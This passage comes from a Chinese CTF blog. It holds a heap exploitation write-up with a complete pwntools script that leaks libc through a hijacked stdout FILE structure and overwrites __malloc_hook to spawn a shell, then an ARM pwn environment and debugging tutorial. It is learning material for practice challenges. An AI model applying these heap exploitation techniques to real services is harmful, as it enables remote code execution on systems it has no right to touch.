0x0000000000000000</span><br><span class="line">0x7f8fe0a6b5e0 &lt;_IO_2_1_stderr_+160&gt;:   0x00007f8fe0a6a660      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b5f0 &lt;_IO_2_1_stderr_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b600 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b610 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007f8fe0a696e0</span><br><span class="line">0x7f8fe0a6b620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007f8fe0a6b6a3</span><br><span class="line">0x7f8fe0a6b630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007f8fe0a6b6a3      0x00007f8fe0a6b6a3</span><br><span class="line">0x7f8fe0a6b640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007f8fe0a6b6a3      0x00007f8fe0a6b6a3</span><br><span class="line">0x7f8fe0a6b650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007f8fe0a6b6a3      0x00007f8fe0a6b6a3</span><br></pre></td></tr></table></figure>

<p>因为我们要在stdout上写入，就必须把它申请出来，并且<strong>fastbin取出chunk是要检查size域的</strong>，所以我们必须要在stdout附近伪造chunk，一般在libc地址上伪造的chunk的size都为7f </p>
<p>通过观察发现如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x7f8fe0a6b620-0x43</span><br><span class="line">0x7f8fe0a6b5dd &lt;_IO_2_1_stderr_+157&gt;:   0x8fe0a6a660000000      0x000000000000007f&lt;--size</span><br><span class="line">0x7f8fe0a6b5ed &lt;_IO_2_1_stderr_+173&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b5fd &lt;_IO_2_1_stderr_+189&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b60d &lt;_IO_2_1_stderr_+205&gt;:   0x0000000000000000      0x8fe0a696e0000000</span><br><span class="line">0x7f8fe0a6b61d &lt;_IO_2_1_stderr_+221&gt;:   0x00fbad288700007f      0x8fe0a6b6a3000000</span><br><span class="line">0x7f8fe0a6b62d &lt;_IO_2_1_stdout_+13&gt;:    0x8fe0a6b6a300007f      0x8fe0a6b6a300007f</span><br><span class="line">0x7f8fe0a6b63d &lt;_IO_2_1_stdout_+29&gt;:    0x8fe0a6b6a300007f      0x8fe0a6b6a300007f</span><br><span class="line">0x7f8fe0a6b64d &lt;_IO_2_1_stdout_+45&gt;:    0x8fe0a6b6a300007f      0x8fe0a6b6a300007f</span><br><span class="line">0x7f8fe0a6b65d &lt;_IO_2_1_stdout_+61&gt;:    0x8fe0a6b6a400007f      0x000000000000007f</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>如上，在 0x7f8fe0a6b5dd 处可以很好的伪造size，后三位为 5dd 所以我们写libc低2字节为b”\xdd\x25”就有1&#x2F;16的概率指向stdout附近。</p>
<p>最后再次通过fastbin_dup申请到__malloc_hook附近用one_gadget来getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-30 19:26:43</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28238</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,message</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;size of the daniu&#x27;s name: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;daniu&#x27;s name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">b&quot;daniu&#x27;s message:&quot;</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod</span>(<span class="params">size,name,message</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;size of the daniu&#x27;s name: \n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&quot;daniu&#x27;s name:\n&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">b&quot;daniu&#x27;s message:\n&quot;</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;daniu&#x27;s index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;\xdd\x25&quot;</span></span><br><span class="line"><span class="comment">##要打IO（hijack stdout）就要在fd或bk指针上留下libc值</span></span><br><span class="line"><span class="comment">##先free一个大的进入unsortedbin，再分配一个相对较小的就可以在它的fd bk上留下libc地址</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#4</span></span><br><span class="line"><span class="comment">#在chunk上留下libc地址</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">##利用程序的特性，部分地址覆盖使其1/16指向_IO_2_1_stdout_附近</span></span><br><span class="line">mod(<span class="number">0x60</span>,offset,offset)  <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##fastbin_dup在fastbin链上留下IOstdout附近的地址</span></span><br><span class="line"><span class="comment">##将其申请出改写</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">mod(<span class="number">0x68</span>,<span class="string">b&#x27;\xd0&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\xd0&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\xd0&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\xd0&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>) <span class="comment">#9</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;Your choice : &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;size of the daniu&#x27;s name: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">sa(<span class="string">b&quot;daniu&#x27;s name:\n&quot;</span>,payload)</span><br><span class="line"><span class="comment">##接收地址并计算</span></span><br><span class="line">data = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">libc_base = data - <span class="number">0x3c5600</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">malloc_hook = libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">fake_chunk = malloc_hook-<span class="number">0x23</span></span><br><span class="line">sl(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">leak(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line">leak(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">leak(<span class="string">&#x27;realloc&#x27;</span>,realloc)</span><br><span class="line"></span><br><span class="line"><span class="comment">##fastbin_dup申请到__malloc_hook附近</span></span><br><span class="line"><span class="comment">##realloc()调整栈帧，one_gadget来getshell</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(fake_chunk),<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;a&quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;a&quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x13</span>+p64(one_gadget)+p64(realloc+<span class="number">0x6</span>),<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your choice : &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1 id="pwn164"><a href="#pwn164" class="headerlink" title="pwn164"></a>pwn164</h1><p>这题用的是realloc分配内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">realloc</span>(<span class="type">void</span>* ptr, <span class="type">size_t</span> size)</span><br></pre></td></tr></table></figure>


<p>关于realloc有几个重要的知识点：</p>
<ul>
<li><p>realloc(ptr,0)相当于free函数</p>
</li>
<li><p>realloc(0.size)相当于malloc函数</p>
</li>
<li><p>realloc(ptr,size)</p>
<ul>
<li><p>newsize&lt;size：进行分割，剩下的chunk如果大于等于MINSIZE则进行free</p>
</li>
<li><p>newsize&lt;size：</p>
<ul>
<li>next 为top且满足需求，直接从top切割</li>
<li>next为freechunk 且满足要求先合并(unlink)再切割</li>
<li>next不满足要求进行malloc(newsize)，然后进行数据拷贝，free原chun</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>关于 realloc的详细介绍，看这位大佬的blog： <a href="https://squarepants0.github.io/2020/11/18/2019-realloc-magic-realloc-yu-tcache/#toc-heading-2">realloc相关知识点</a></p>
<p><strong>解题:</strong></p>
<p>本题就两个函数一个realloc,一个free函数。很简单</p>
<p>在realloc的时候,因为每次都是使用realloc_ptr,并且没有变化,导致每次申请的的chunk都会写在realloc_ptr指向的地址,再次申请比上一次的size大就可以往后溢</p>
<p><strong>利用思路：</strong></p>
<p>主要利用基础：UAF，double free</p>
<p>注意到题目中是没有show类型的函数的，<strong>所以想进行地址泄露应该要靠IO_FILE攻击</strong></p>
<p>难点：<strong>利用realloc进行堆块合并后，再利用UAF进行地址覆盖</strong></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>arm基础+pwn</title>
    <url>/2025/07/08/arm%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<h1 id="arm-pwn环境搭建运行"><a href="#arm-pwn环境搭建运行" class="headerlink" title="arm_pwn环境搭建运行"></a>arm_pwn环境搭建运行</h1><p><a href="https://nuoye-blog.github.io/2020/07/24/22a5ca48/">环境搭建参考链接</a></p>
<p>搭建好后找一个arm_pwn文件</p>
<p><strong>checksec可正常检测pwn文件关于arm架构</strong></p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">$ checksec pwnme                                                                           </span><br><span class="line">[*] <span class="string">&#x27;/arm_pwn/pwnme&#x27;</span></span><br><span class="line">    Arch:       arm-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x10000)</span><br></pre></td></tr></table></figure>

<p><strong>qemu（ai解释）：</strong></p>
<ol>
<li><strong>为了能运行 (Execution):</strong> 没有 QEMU 这个“翻译官”，你的 x86 电脑根本无法执行 ARM 指令，程序连第一行代码都跑不起来。</li>
<li><strong>为了方便 (Convenience):</strong> 你不需要为了 pwn 一个 ARM 程序就去买一台树莓派或者其他 ARM 开发板。你可以在你最熟悉的 x86&#x2F;Linux 环境下完成所有的分析和利用开发工作。</li>
<li><strong>为了调试 (Debugging):</strong> 正如上一个回答提到的，QEMU 的 -g 参数可以把它变成一个 GDB 服务器，让你能够使用 gdb-multiarch 这种强大的工具去单步调试、下断点、检查内存，这对于漏洞利用来说是必不可少的。</li>
</ol>
<p><strong>QEMU 为异构架构的程序（比如ARM）在本地计算机（x86）上创造了一个可以运行、可以调试的完整虚拟环境。</strong></p>
<p>配置好环境后我们知道arm架构的程序不能直接在本地计算机运行需要借助qemu这个虚拟环境来进行远程调试，下面将有gdb和ida的远程调试</p>
<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>先运行命令，将程序运行在1234端口</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">qemu-arm -L ./ -g 1234 ./pwn</span><br></pre></td></tr></table></figure>

<p>gdb命令：</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br></pre></td></tr></table></figure>

<p>运行起来后先设置架构</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">arch</span> arm</span><br></pre></td></tr></table></figure>

<p>然后监听1234端口即可进行调试</p>
<figure class="highlight zsh"><table><tr><td class="code"><pre><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>



<p>最后的调试就和gdb命令一样啦</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"> //使用gdb编译 -g -o</span><br><span class="line">$ gdb -g program.c(源码) -o program(可执行文件)</span><br><span class="line">​</span><br><span class="line">//启动gdb调试</span><br><span class="line">$ gdb program(可执行文件名)</span><br><span class="line">​</span><br><span class="line">//运行</span><br><span class="line">(gdb)start   //程序运行，并停在第一行</span><br><span class="line">(gdb)r       //run，程序运行，遇到断点才停</span><br><span class="line">(gdb)c       //continue，继续运行</span><br><span class="line">(gdb)n 或者 s   //按照C语言行级别的单步调试，n(跟踪，不进入函数内部)，s(步入，进入函数内部)</span><br><span class="line">(gdb)ni 或者si  //按照汇编代码行级别的单步调试</span><br><span class="line">​</span><br><span class="line">//断点</span><br><span class="line">(gdb)b 函数名  //下断点 ，其他用法：b *地址；b 行号；b *函数名，断点设置在函数的开头</span><br><span class="line">(gdb)i b     //查看断点， info break</span><br><span class="line">(gdb)d 断点编号     //删除断点</span><br><span class="line">(gdb)clear 函数名/行号   //删除加在某个函数或某行的断点</span><br><span class="line">(gdb)commands 断点编号   //断点后添加代码，达到自动化调试</span><br><span class="line">     &gt; 代码</span><br><span class="line">     &gt; end</span><br><span class="line">(gdb)disable 断点编号   //设置断点无效</span><br><span class="line">(gdb)enable 断点编号    //设置断点生效</span><br><span class="line">(gdb)b 行号 if 条件    //设置条件断点 </span><br><span class="line">​</span><br><span class="line">//显示</span><br><span class="line">(gdb)disas 函数名   //disassemble，查看函数的汇编指令</span><br><span class="line">(gdb)info line   //查看当前位置的源代码在内存中地址，info 后面还可以加其它的，用于查看相关信息</span><br><span class="line">(gdb)x/从内存地址开始要显示内存单元的个数  内存地址   //显示内存</span><br><span class="line">​</span><br><span class="line">Ctrl+X+A   //进入或退出图形化调试窗口，或者在运行时使用gdb -tui 可执行文件名</span><br><span class="line">(gdb)layout regs  //实时显示寄存器值和源码的变化，layout后面还可以+ src(仅显示源代码窗口)/asm(仅显示汇编代码窗口)/split(显示源代码和汇编代码窗口)，layout next/prev(切换窗口)</span><br><span class="line">(gdb)win asm/src/split/regs +/- 行数  //调整窗口大小</span><br><span class="line">(gdb)tui reg float/system/general  //显示浮点寄存器/系统寄存器/通用寄存器</span><br><span class="line">​</span><br><span class="line">//查看当前代码</span><br><span class="line">(gdb)l    //list简写，从默认位置显示，显示当前行后面的源程序</span><br><span class="line">(gdb)l 行号   //从指定行显示</span><br><span class="line">(gdb)l 函数名   //从指定函数显示</span><br><span class="line">(gdb)show list  //显示list展示的行数</span><br><span class="line">(gdb)set list 行数  //设置list展示的行数</span><br><span class="line">​</span><br><span class="line">//打印，变量</span><br><span class="line">(gdb)p 变量名    //print，打印变量值</span><br><span class="line">(gdb)ptype 变量名  //打印变量类型</span><br><span class="line">(gdb)display 变量名   //跟踪查看一个变量，每次都停下来显示它的值</span><br><span class="line">(gdb)i display    //查看设置的自动变量操作</span><br><span class="line">(gdb)undisplay 自动变量编号   //取消对先前设置的那些变量的跟踪</span><br><span class="line">(gdb)set var 变量名 = 变量值  //设置变量</span><br><span class="line">(gdb)finish   //跳出函数体</span><br><span class="line">(gdb)until    //跳出循环</span><br></pre></td></tr></table></figure>

<h2 id="ida远程调试"><a href="#ida远程调试" class="headerlink" title="ida远程调试"></a>ida远程调试</h2><p>在linux系统中先运行起来<code>qemu-arm -L ./ -g 1234 ./pwn</code></p>
<p>设置debugger为Remote GDB debugger</p>
<img data-src="../images/image-20250714112054770.png" alt="image-20250714112054770" style="zoom: 50%;" />

<p>然后按照以下流程：debugger —-&gt; process options —-&gt; 填写 hostname和post —-&gt; OK —-&gt;debugger的attach to process</p>
<p>即可在ida中调试对应程序</p>
<p>ida调试基础：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">F9:运行（在调试器中启动一个新的进程或继续调试另一个进程）</span><br><span class="line">F2：设置断点</span><br><span class="line">Ctrl+F2：终止调试进程</span><br><span class="line">F4：执行到光标处</span><br><span class="line">F7:单步步入（进入函数内部）</span><br><span class="line">Ctrl+F7：执行到从当前函数返回时</span><br><span class="line">F8：单步跟踪（不进入函数内部）</span><br><span class="line">F5：查看伪代码</span><br><span class="line">Tab：伪代码和汇编指令之间的切换</span><br><span class="line">Ctrl+alt+S：打开堆栈记录窗口</span><br><span class="line">Ctrl+alt+B：打开断点窗口</span><br><span class="line">​</span><br><span class="line">Esc：在反汇编窗口中，返回到上一步操作的位置</span><br><span class="line">空格键：在反汇编窗口中，切换图形视图与列表视图</span><br><span class="line">​</span><br><span class="line">shift+F12:查看字符串</span><br><span class="line">Alt+T：搜索字符串</span><br><span class="line">Alt+B：搜索二进制序列</span><br><span class="line">Ctrl+B：搜索下一个字符串/二进制序列</span><br><span class="line">​</span><br><span class="line">Alt+M:给某个地址设置标签</span><br><span class="line">Ctrl+M：跳转到标签，通常配合Alt+M使用</span><br><span class="line">Ctrl+W：保存IDA数据库</span><br><span class="line">Ctrl+Shift+W：拍摄IDA快照</span><br><span class="line">​</span><br><span class="line">【；】：重复注释，会在所有引用到的地方都出现注释</span><br><span class="line">【：】：普通注释</span><br><span class="line">P：将数据转换为函数</span><br><span class="line">C: 将数据转化为代码，无法识别栈帧</span><br><span class="line">A：转换为字符串</span><br><span class="line">D：转换为数据</span><br><span class="line">U：转换为未定义数据</span><br><span class="line">X：查看交叉引用</span><br><span class="line">Y：修改类型</span><br><span class="line">N：修改名称</span><br><span class="line">G：转到指定地址</span><br><span class="line">H：十进制和十六进制转换</span><br></pre></td></tr></table></figure>

<p><strong>一些小技巧</strong></p>
<table>
<thead>
<tr>
<th align="left">架构</th>
<th align="left">关键识别词</th>
<th align="left">工具链包名 (Debian&#x2F;Ubuntu)</th>
<th align="left">反汇编命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>64位 ARM</strong></td>
<td align="left"><code>aarch64</code></td>
<td align="left"><code>binutils-aarch64-linux-gnu</code></td>
<td align="left"><code>aarch64-linux-gnu-objdump</code></td>
</tr>
<tr>
<td align="left"><strong>32位 ARM</strong></td>
<td align="left"><code>ARM</code>, <code>EABI5</code></td>
<td align="left"><code>binutils-arm-linux-gnueabihf</code></td>
<td align="left"><code>arm-linux-gnueabihf-objdump</code></td>
</tr>
</tbody></table>
<p>这两个工具包包含了对应的objdump与Linux中的objdump一样</p>
<p>常用命令：</p>
<ul>
<li><code>aarch64-linux-gnu-objdump -D ./test | less</code>  分页反汇编所有段 </li>
<li><code>objdump -f ./test </code> 显示文件头信息</li>
<li><code>readelf -h ./test</code>  显示文件头信息</li>
<li>_start即相当于_libc_start_main</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400490 &lt;_start&gt;:</span><br><span class="line">  400490:   mov     x29, #0x0         // 清空帧指针</span><br><span class="line">  400494:   mov     x30, #0x0         // 清空链接寄存器</span><br><span class="line">  400498:   ldr     x1, [sp]          // 从栈顶加载 argc 到 x0 (实际上是x1)</span><br><span class="line">  40049c:   add     x1, sp, #8        // 计算 argv 的地址给 x1</span><br><span class="line">  ...</span><br><span class="line">  4004b0:   bl      0x4006c0 &lt;main&gt;   // 调用 main 函数</span><br><span class="line">  4004b4:   mov     w0, w19           // main 返回后，将其返回值放入 w0</span><br><span class="line">  4004b8:   bl      0x4005e0 &lt;exit&gt;   // 调用 exit</span><br></pre></td></tr></table></figure>
<p><em>(注意：不同编译器和库版本，这里的实现细节会略有不同，但流程是一致的)</em></p>
<table>
<thead>
<tr>
<th align="left">概念</th>
<th align="left">含义</th>
<th align="left">如何找到&#x2F;定义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>入口点 (Entry Point)</strong></td>
<td align="left">OS 加载后执行的<strong>第一条指令</strong>的地址。</td>
<td align="left">• 用 <code>readelf -h</code> 查看<br>• 默认标签是 <code>_start</code></td>
</tr>
<tr>
<td align="left"><strong><code>main</code> 函数</strong></td>
<td align="left">C&#x2F;C++ 语言的<strong>逻辑起点</strong>，被 <code>_start</code> 调用。</td>
<td align="left">• 一个普通的函数，我们写的代码从这里开始。</td>
</tr>
</tbody></table>
<h1 id="arm基础知识"><a href="#arm基础知识" class="headerlink" title="arm基础知识"></a>arm基础知识</h1><p><a href="https://sky123.blog.csdn.net/article/details/128270882?spm=1001.2014.3001.5502">一篇不错的文章</a></p>
<h2 id="arm32"><a href="#arm32" class="headerlink" title="arm32"></a>arm32</h2><h3 id="碎知识"><a href="#碎知识" class="headerlink" title="碎知识"></a>碎知识</h3><p>来自《ARM汇编与逆向工程》的摘要</p>
<p>arm的传参方式为使用r0~r3寄存器传递前4个参数，多余的参数使用栈来传递</p>
<p>STMFD指令可以一次性将多个寄存器按逆序压入栈里</p>
<p>其中主要到STMFD结尾的D，可以理解为decrease，递减。那么同理STMFA指令就是按正序将寄存器压入栈里</p>
<p>与STMFD对应的LDMFD，作用类似于pop，可以按顺序将数据从栈里弹出到寄存器里。</p>
<p>arm里没有ret指令，程序是通过将栈里的地址弹到pc寄存器，从而实现函数返回。</p>
<p>arm使用r0作为函数的返回值寄存器</p>
<p>其中str指令，可以理解为STORE REGISTER，即将寄存器的值保存到内存中。与STR指令对应的LDR，即从内存数据加载到寄存器。</p>
<p>arm中的mov指令，只能是寄存器与寄存器之间或寄存器与立即数之间的操作，而不能对内存进行mov操作</p>
<p>arm中的B指令，时无条件跳转指令，类似于x86下的jmp</p>
<p>而BL指令是带返回的跳转，类似于x86下的call，会将返回地址压栈</p>
<p>表4.4 AArch32 通用寄存器别名</p>
<table>
<thead>
<tr>
<th>寄存器编号</th>
<th>别名</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>R11</td>
<td>FP</td>
<td>栈帧指针</td>
</tr>
<tr>
<td>R12</td>
<td>IP</td>
<td>子程序内部调用寄存器</td>
</tr>
<tr>
<td>R13</td>
<td>SP</td>
<td>栈指针</td>
</tr>
<tr>
<td>R14</td>
<td>LR</td>
<td>链接寄存器</td>
</tr>
<tr>
<td>R15</td>
<td>PC</td>
<td>程序计数器</td>
</tr>
</tbody></table>
<p>表5.1 移位操作语法符号</p>
<table>
<thead>
<tr>
<th>A32&#x2F;T32</th>
<th>A64 (32 位)</th>
<th>A64 (64 位)</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Rd</td>
<td>Wd</td>
<td>Xd</td>
<td>目标寄存器</td>
</tr>
<tr>
<td>Rn</td>
<td>Wn</td>
<td>Xn</td>
<td>第一源寄存器</td>
</tr>
<tr>
<td>Rm</td>
<td>Wm</td>
<td>Xm</td>
<td>第二源寄存器</td>
</tr>
<tr>
<td>Rs</td>
<td>Ws</td>
<td>Xs</td>
<td>保存移位量的源寄存器</td>
</tr>
<tr>
<td>#n</td>
<td>#n</td>
<td>#n</td>
<td>移位量（立即数）</td>
</tr>
<tr>
<td>{Rd,}</td>
<td>-</td>
<td>-</td>
<td>可选寄存器</td>
</tr>
</tbody></table>
<p>LDR和STR是一对相反的指令，LDR R1,[R0]将R0处的东西加载到R1,STR R1,[R0]将R1的东西加载到R0指向处</p>
<h3 id="Thumb模式"><a href="#Thumb模式" class="headerlink" title="Thumb模式"></a>Thumb模式</h3><p>ARM有两种主要的状态，ARM和Thumb模式，两种状态在所有的权限下都可以运行。</p>
<p><a href="https://blog.csdn.net/beyond702/article/details/50899196">参考链接</a></p>
<p>Thumb模式是16位模式，Thumb模式是16位模式，在该模式下，32位指令将为无效指令。Thumb指令为16位。Thumb模式的存在，使得代码更紧凑，有时单的语句，thumb指令2字节完成，而arm指令4字节完成，由此可以节省空间。</p>
<p>Arm与thumb模式的切换，主要是改变CPSR状态寄存器里的T标志位，如图，当T标志位为1时，cpu将处于thumb工作模式，反之，处于arm模式。<br><img data-src="../images/image-20250714201432283.png" alt="image-20250714201432283" style="zoom:67%;" /></p>
<p>即：</p>
<p><img data-src="/../images/f1078db8f11b422accaaee75a12afda8.png" alt="img"></p>
